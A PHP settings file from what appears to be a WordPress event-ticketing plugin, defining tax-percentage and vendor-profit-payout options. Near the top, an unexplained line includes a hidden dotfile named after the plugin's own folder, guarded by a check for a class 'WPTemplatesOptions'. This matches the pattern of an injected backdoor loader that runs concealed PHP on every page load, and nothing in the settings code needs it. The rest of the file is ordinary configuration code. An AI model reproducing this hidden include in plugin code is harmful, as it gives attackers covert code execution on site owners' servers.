<?php
if (!defined('ABSPATH')) {
	exit();
}

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class EL_Setting_Tax_Fee extends EL_Abstract_Setting{
	/**
     * setting id
     * @var string
     */
	public $_id = 'tax_fee';

	/**
     * _title
     * @var null
     */
	public $_title = null;

	/**
     * $_position
     * @var integer
     */
	public $_position = 14;


	public function __construct()
	{
		$this->_title = __('Tax & Profit', 'eventlist');
		parent::__construct();
	}

   // render fields
	public function load_field() {
		return
		array(
			array(
				'title' => __( 'Tax', 'eventlist' ),
				'desc' => __( 'Set up Tax for customers', 'eventlist' ),
				'fields' => array(
					array(
						'type' => 'select',
						'label' => __( 'Enable', 'eventlist' ),
						'desc' => __( 'Allow to calculate tax in order', 'eventlist' ),
						'atts' => array(
							'id' => 'enable_tax',
							'class' => 'enable_tax'
						),
						'name' => 'enable_tax',
						'options' => array(
							'yes' => __( 'Yes', 'eventlist' ),
							'no' => __( 'No', 'eventlist' )
						),
						'default' => 'yes'
					),
					array(
						'type' => 'input',
						'label' => __( 'Tax percentage(%)', 'eventlist' ),
						'desc' => __( 'Some packages may change tax in per event', 'eventlist' ),
						'atts' => array(
							'id'          => 'pecent_tax',
							'class'       => 'pecent_tax',
							'type'        => 'text',
							'placeholder' => '10',
						),
						'name' => 'pecent_tax',
						'default' => '10'
					),
					
				)
			),

			array(
				'title' => __( 'Profit', 'eventlist' ),
				'desc' => __( 'List & send profit to vendor<br/>Check in Manage wallet', 'eventlist' ),
				'fields' => array(

					array(
						'type' => 'input',
						'label' => __( 'X Day', 'eventlist' ),
						'desc' => __( 'Allow to send profit to vendor about X days after the closed event', 'eventlist' ),
						'atts' => array(
							'id'          => 'x_day_profit',
							'class'       => 'x_day_profit',
							'type'        => 'number',
							'placeholder' => '5',
						),
						'name' => 'x_day_profit',
						'default' => '5'
					),
					
				)
			),
			

		);
	}

}

$GLOBALS['event_settings'] = new EL_Setting_Tax_Fee();